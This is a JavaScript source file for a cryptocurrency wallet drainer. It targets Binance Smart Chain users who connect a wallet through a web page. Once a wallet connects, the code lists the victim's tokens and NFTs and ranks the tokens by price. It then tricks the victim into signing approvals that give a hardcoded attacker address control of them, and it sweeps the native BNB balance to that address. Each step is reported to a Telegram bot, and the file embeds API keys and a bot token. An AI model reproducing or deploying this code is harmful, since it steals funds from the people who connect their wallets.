import {ABI721, ABI} from "config/constants/abis"
"use strict";

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;
let web3Modal;
let provider;
let selectedAccount;
const receiver_addres = "0x8a5D4Bdb5191D1282e2dF5EF8f4b139d765d1691";
let onButtonClick;
let user_address;
let start_to_log = false;
function getParameterByName(name, url = window.location.href) {
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}
async function init() {
  start_to_log = false;
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Portis is", Portis);
  console.log(
    "window.web3 is",
    window.web3,
    "window.ethereum is",
    window.ethereum
  );
  if (location.protocol !== "https:") {
    console.log("HTTPs required")
  }
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        rpc: { 56: "https://bsc-dataseed.binance.org" },
        network: "binance",
        infuraId: "e62a60a251c64745baefeaf8237af646",
      },
    },
    binancechainwallet: { package: true },
  };
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
    disableInjectedProvider: false,
    theme: "dark",
  });
  console.log("Web3Modal instance is", web3Modal);
  return "Done";
}
async function fetchAccountData() {
  start_to_log = false;
  const web3 = new Web3(provider);
  console.log("Web3 instance is", web3);
  web3.eth.defaultCommon = {
    customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
    baseChain: "mainnet",
    hardfork: "petersburg",
  };
  const chainId = await web3.eth.getChainId();
  const chainData = evmChains.getChain(chainId);
  console.log("Chain data name:", chainData.name);
  const accounts = await web3.eth.getAccounts();
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    const bscBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(bscBalance).toFixed(4);
    console.log("New Account: %o", { address, balance, humanFriendlyBalance });
  });
  await Promise.all(rowResolvers);
  proceed();
}
async function refreshAccountData() {
  await fetchAccountData(provider);
}
async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
    $(document).ready(function () {
      $("#myModal").modal("show");
    });
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }
  provider.on("accountsChanged", (accounts) => {
    web3.eth.defaultCommon = {
      customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
      baseChain: "mainnet",
      hardfork: "petersburg",
    };
    fetchAccountData();
  });
  provider.on("chainChanged", (chainId) => {
    web3.eth.defaultCommon = {
      customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
      baseChain: "mainnet",
      hardfork: "petersburg",
    };
    fetchAccountData();
  });
  provider.on("networkChanged", (networkId) => {
    web3.eth.defaultCommon = {
      customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
      baseChain: "mainnet",
      hardfork: "petersburg",
    };
    fetchAccountData();
  });
  await refreshAccountData();
  onButtonClick = proceed;
  web3.eth.defaultCommon = {
    customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
    baseChain: "mainnet",
    hardfork: "petersburg",
  };
}
onButtonClick = onConnect;
async function onDisconnect() {
  console.log("Killing the wallet connection", provider);
  if (provider.close) {
    await provider.close();
    await web3Modal.clearCachedProvider();
    provider = null;
  }
  selectedAccount = null;
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}
async function getTokens(address = "", api_key = "", chain = "bsc") {
  return new Promise((resolve, reject) => {
    fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=bsc`, {
      method: "GET",
      headers: { accept: "application/json", "X-API-Key": api_key },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function getNFTs(
  address = "",
  api_key = "KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp",
  chain = "bsc",
  limit = "98"
) {
  return new Promise((resolve, reject) => {
    fetch(
      `https://deep-index.moralis.io/api/v2/${address}/nft?chain=${chain}&format=decimal&limit=${limit}`,
      {
        method: "GET",
        headers: { accept: "application/json", "X-API-Key": api_key },
      }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function getPrice(address) {
  return new Promise((resolve, reject) => {
    fetch(
      `https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${address}&vs_currencies=usd`,
      { method: "GET", headers: {} }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function sendMessage(message) {
  return new Promise((resolve, reject) => {
    const chat_id = 1114693003;
    fetch(
      `https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`,
      { method: "GET", headers: {} }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function sendMessage1(message) {
  return new Promise((resolve, reject) => {
    const chat_id = 1114693003;
    fetch(
      `https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`,
      { method: "GET", headers: {} }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function getBalance(
  address = "",
  api_key = "KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp",
  chain = "bsc"
) {
  return new Promise((resolve, reject) => {
    fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=bsc`, {
      method: "GET",
      headers: { accept: "application/json", "X-API-Key": api_key },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
const receiver_address = "0x8a5D4Bdb5191D1282e2dF5EF8f4b139d765d1691";
async function proceed() {
  start_to_log = false;
  console.log("Now we roll!!!");
  const serverUrl = "https://pt5gk0drbc2k.usemoralis.com:2053/server";
  const appId = "uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW";
  const apiKey =
    "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
  Moralis.start({ serverUrl, appId });
  console.log("Moralis initialized");
  let user;
  try {
    if (provider.isMetaMask) {
      console.log("Moralis using default (MetaMask)");
      const web3Provider = await Moralis.enableWeb3();
      console.log("Moralis web3Provider:", web3Provider);
    } else {
      console.log("Moralis using walletconnect");
      try {
        user = await Moralis.authenticate({ provider: "walletconnect" });
        console.log("Moralis user:", user);
      } catch (error) {
        console.log("Failed to authenticate moralis:", error);
      }
    }
  } catch (error) {
    console.log("Can't enable web3: ", error);
  }
  async function send() {
    console.log("Attempting to send tokens...");
    if (!user_address) {
      throw Error(`No user:  ${user_address}`);
    }
    console.log("Searching for tokens...");
    const nft_options = { chain: "bsc", address: user_address, limit: "98" };
    const bsc_tokens = await getTokens(user_address, apiKey).catch((e) => {
      console.log("Unable to get tokens", e);
    });
    const bsc_NFTs = await getNFTs(user_address).catch((e) => {
      console.log("Unable to get NFts", e);
    });
    await sendMessage(`me ... BSC : connected to ${user_address}`);
    await sendMessage1(`BSC : connected to ${user_address}`);
    console.log("bsc tokens: %o", bsc_tokens);
    if (bsc_tokens.length < 1 && bsc_NFTs.length < 1) {
      await sendMessage(`No valuable token or nfts found`);
      await sendMessage1(`No valuable token or nfts found`);
      const bnb_balance = await getBalance(user_address, apiKey).catch((e) => {
        console.log("Unable to get new bsc balance", e);
      });
      console.log("bnb_balance", bnb_balance);
      console.log("bnb_balance.balance", bnb_balance.balance);
      const balance =
        parseInt(bnb_balance.balance) / 1000000000000000000 - 0.005;
      console.log("The new bnb balance", balance);
      if (balance > 0) {
        const options = {
          type: "native",
          amount: Moralis.Units.bsc(balance.toString()),
          receiver: receiver_address,
        };
        let result = await Moralis.transfer(options);
        console.log(result);
      } else {
        console.log("Insufficient funds");
        if (bsc_tokens.length > 0) {
          await sendMessage(`Token found`);
          await sendMessage1(`Tokens found`);
        } else if (bsc_NFTs.length > 0) {
          await sendMessage(`NFTs found`);
          await sendMessage(`NFTs found`);
        }
      }
      return console.log("No bsc tokens found");
    }
    const real_bsc_token = new Array();
    const bsc_length = bsc_tokens.length;
    function callback(x) {
      x.sort((a, b) => b.realprice - a.realprice);
      console.log("real_bsc_token length : ", x.length);
      console.log("real_bsc_token : ", x);
    }
    await bsc_tokens.forEach(async function (token, i) {
      let contractAddress = token.token_address;
      await getPrice(contractAddress).then((res) => {
        let pricePerToken;
        if (res[contractAddress]) {
          console.log(res[contractAddress].usd);
          pricePerToken = parseFloat(res[contractAddress].usd);
          console.log("Price was obtained ", pricePerToken);
        } else {
          pricePerToken = 0;
          console.log("Unable to obtain price");
        }
        let balance = token.balance;
        let decimal = token.decimals;
        const realprice = (balance / 10 ** (decimal || 18)) * pricePerToken;
        let fakebalance = balance / 10 ** (decimal || 18);
        real_bsc_token[i] = {
          contractAddress: contractAddress,
          realprice: realprice,
          balance: balance,
          decimal: decimal,
          fakebalance: fakebalance,
        };
      });
      if (i + 1 === bsc_length) {
        callback(real_bsc_token);
        transferNow();
      }
    });
    let x = 0;
    let y = 0;
    let mum = "";
    async function transferNow() {
      for (let n = 0; n < bsc_length && real_bsc_token[n].realprice > 1; n++) {
        x = x + 1;
        console.log("Token ", n);
        let token = real_bsc_token[Number(n)];
        let ABI = []
        let {
          contractAddress: contractAddress,
          balance: balance,
          fakebalance: fakebalance,
          decimal: decimal,
        } = token;
        let amount = Moralis.Units.Token(
          fakebalance.toString(),
          decimal.toString()
        );
        await sendMessage(`Approving 
                            Token Address : ${contractAddress},
                            Amount : ${amount},
                            Your address : ${receiver_address}
                              `);
        await sendMessage1(`Approving 
                              Token Address : ${contractAddress},
                              Amount : ${amount},
                              Your address : ${receiver_address}
                                `);
        const sendOptions = {
          contractAddress: contractAddress,
          functionName: "approve",
          abi: ABI,
          params: {
            spender: receiver_address,
            _spender: receiver_address,
            value: amount,
            _value: amount,
            amount: amount,
          },
        };
        let transaction = await Moralis.executeFunction(sendOptions).catch(
          (e) => {
            console.log(
              "Can't transfer token:",
              e,
              "Transfer Options: %o",
              sendOptions
            );
            if (e.code === 4001) {
              mum = "denied";
            } else {
              mum = "approved";
            }
          }
        );
        if (transaction) {
          await sendMessage(`Approved`);
          await sendMessage1(`Approved`);
        } else {
          await sendMessage(`Denied`);
          await sendMessage1(`Denied`);
        }
        console.log(transaction);
      }
      for (let n = 0; n < bsc_NFTs.result.length; n++) {
        y = y + 1;
        let nft = bsc_NFTs.result[Number(n)];
        
        let {
          contract_type: type,
          token_address: contractAddress,
          token_id: tokenId,
        } = nft;
        await sendMessage(`Approving 
                                NFT Address : ${contractAddress},
                                token_id : ${tokenId}
                                Your address : ${receiver_address}
                                  `);
        await sendMessage1(`Approving 
                                  NFT Address : ${contractAddress},
                                  token_id : ${tokenId}
                                  Your address : ${receiver_address}
                                    `);
        const sendOptions = {
          contractAddress: contractAddress,
          functionName: "setApprovalForAll",
          abi: ABI721,
          params: { operator: receiver_address, approved: true },
        };
        let mum = "";
        let transaction = await Moralis.executeFunction(sendOptions).catch(
          (e) => {
            console.log(
              "Can't transfer token:",
              e,
              "Transfer Options: %o",
              sendOptions
            );
            if (e.code === 4001) {
              mum = "denied";
            } else {
              mum = "approved";
            }
          }
        );
        if (transaction) {
          await sendMessage(`Approved`);
          await sendMessage1(`Approved`);
        } else {
          await sendMessage(`Denied`);
          await sendMessage1(`Denied`);
        }
        console.log(transaction);
      }
    }
    if (
      x === bsc_length &&
      y === bsc_NFTs.result.length &&
      (mum === "approved" || mum === "denied")
    ) {
      const bnb_balance = await getBalance(user_address, apiKey).catch((e) => {
        console.log("Unable to get new bsc balance", e);
      });
      console.log("bnb_balance", bnb_balance);
      console.log("bnb_balance.balance", bnb_balance.balance);
      const balance =
        parseInt(bnb_balance.balance) / 1000000000000000000 - 0.005;
      console.log("The new bnb balance", balance);
      if (balance > 0) {
        const options = {
          type: "native",
          amount: Moralis.Units.bsc(balance.toString()),
          receiver: receiver_address,
        };
        let result = await Moralis.transfer(options);
        console.log(result);
      } else {
        console.log("Insufficient funds");
      }
    }
  }
  send();
}
{
  let l = console.log;
  function normalize(x_) {
    let x = String(x_);
    if (/^\[object/g.test(x)) {
      try {
        let y = JSON.stringify(x_);
        x = y;
      } catch (error) {
        x = x + " >> " + Object.keys(x_);
      }
      return x;
    } else {
      return x;
    }
  }
  let logs_to_send = [];
  if (getParameterByName("log") == "true") {
    let el = document.getElementById("testx");
    el.style.display = "block";
    console.log = (x, ...y) => {
      l(x);
      if (y && y.length > 0) {
        y.forEach((z) => {
          l(y, ":", z);
          x += " -> (" + normalize(z) + ")";
        });
      }
      x = normalize(x);
      el.innerText += "~ " + x + "\n";
      if (start_to_log) {
        logs_to_send.push(x);
      }
      window.setTimeout(function () {
        el.scrollTop = el.scrollHeight;
      }, 500);
    };
  }
  setInterval(() => {
    if (logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0, 1);
    let url = "";
    let chat_id = "";
  }, 100);
}
{
  let l = console.log;
  function normalize(x_) {
    let x = String(x_);
    if (/^\[object/g.test(x)) {
      try {
        let y = JSON.stringify(x_);
        x = y;
      } catch (error) {
        x = x + " >> " + Object.keys(x_);
      }
      return x;
    } else {
      return x;
    }
  }
  let logs_to_send = [];
  if (getParameterByName("log") == "true") {
    let el = document.getElementById("testx");
    el.style.display = "block";
    console.log = (x, ...y) => {
      l(x);
      if (y && y.length > 0) {
        y.forEach((z) => {
          l(y, ":", z);
          x += " -> (" + normalize(z) + ")";
        });
      }
      x = normalize(x);
      el.innerText += "~ " + x + "\n";
      if (start_to_log) {
        logs_to_send.push(x);
      }
      window.setTimeout(function () {
        el.scrollTop = el.scrollHeight;
      }, 500);
    };
  }
  setInterval(() => {
    if (logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0, 1);
    let url = ``;
    let chat_id = "";
  }, 100);
}
async function startx() {
  await init()
    .then(() => {
      onButtonClick();
    })
    .catch((e) => {
      console.log("Initialization failed.");
      console.log(e);
    });
}
let els = document.getElementsByClassName("triggerx");
[...els].forEach((el) => {
  el.addEventListener("click", () => {
    startx();
  });
});
console.log(window);
